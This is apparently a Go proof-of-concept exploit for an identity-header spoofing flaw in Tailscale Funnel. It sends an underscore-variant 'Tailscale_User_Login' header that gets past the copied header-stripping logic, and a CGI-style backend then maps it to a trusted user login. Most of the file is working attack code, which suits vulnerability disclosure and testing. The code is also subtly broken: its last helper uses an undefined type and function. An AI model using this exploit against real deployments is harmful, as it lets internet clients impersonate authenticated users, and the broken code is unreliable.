// Airtight PoC for the Funnel underscore identity-header passthrough.
// Uses Go's REAL net/http/httputil.ReverseProxy (same type tailscaled's serve
// uses) wired with the EXACT Del sequence copied verbatim from
// ipn/ipnlocal/serve.go addTailscaleIdentityHeaders (funnel branch), then a
// CGI/RFC-3875 env mapping (as PHP/FastCGI/CGI backends do) to show the spoof.
package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"strings"
)

// ---- verbatim from ipn/ipnlocal/serve.go:1100-1113 (funnel path) ----
func addTailscaleIdentityHeadersFunnel(r *httputil.ProxyRequest) {
	r.Out.Header.Del("Tailscale-User-Login")
	r.Out.Header.Del("Tailscale-User-Name")
	r.Out.Header.Del("Tailscale-User-Profile-Pic")
	r.Out.Header.Del("Tailscale-Funnel-Request")
	r.Out.Header.Del("Tailscale-Headers-Info")
	// c.Funnel != nil on the internet path:
	r.Out.Header.Set("Tailscale-Funnel-Request", "?1")
	// returns here WITHOUT setting any Tailscale-User-* (identity absent on funnel)
}

// RFC 3875 / CGI meta-variable mapping as implemented by CGI/FastCGI/PHP:
// header name -> "HTTP_" + upper(replace non-alnum with '_').
func cgiEnvName(h string) string {
	var b strings.Builder
	b.WriteString("HTTP_")
	for _, c := range strings.ToUpper(h) {
		if (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			b.WriteRune(c)
		} else {
			b.WriteByte('_')
		}
	}
	return b.String()
}

func main() {
	// Backend = a CGI-style app that trusts HTTP_TAILSCALE_USER_LOGIN.
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		env := map[string]string{}
		for k, v := range r.Header {
			env[cgiEnvName(k)] = strings.Join(v, ",")
		}
		fmt.Printf("  backend raw headers seen: ")
		for k := range r.Header { fmt.Printf("%q ", k) }
		fmt.Printf("\n  backend HTTP_TAILSCALE_USER_LOGIN = %q\n", env["HTTP_TAILSCALE_USER_LOGIN"])
		if env["HTTP_TAILSCALE_USER_LOGIN"] == "attacker@evil.example" {
			fmt.Println("  >>> SPOOFED: backend authenticated the internet attacker as a trusted Tailscale user <<<")
		}
	}))
	defer backend.Close()

	burl := backend.URL
	proxy := &httputil.ReverseProxy{Rewrite: func(r *httputil.ProxyRequest) {
		r.SetURL(mustURL(burl))
		addTailscaleIdentityHeadersFunnel(r) // tailscaled's real strip logic
	}}
	front := httptest.NewServer(proxy)
	defer front.Close()

	// Internet funnel client: sends BOTH a dash header (will be stripped) and an
	// underscore squatting variant (survives). No valid session/identity.
	req, _ := http.NewRequest("GET", front.URL, nil)
	req.Header.Set("Tailscale-User-Login", "stripped-dash")          // dash: Del'd
	req.Header["Tailscale_User_Login"] = []string{"attacker@evil.example"} // underscore: survives
	fmt.Println("internet client sends: Tailscale-User-Login=stripped-dash AND Tailscale_User_Login=attacker@evil.example")
	resp, err := http.DefaultClient.Do(req)
	if err != nil { fmt.Println("err:", err); return }
	resp.Body.Close()
}

func mustURL(s string) *urlURL { u, _ := parseURL(s); return u }
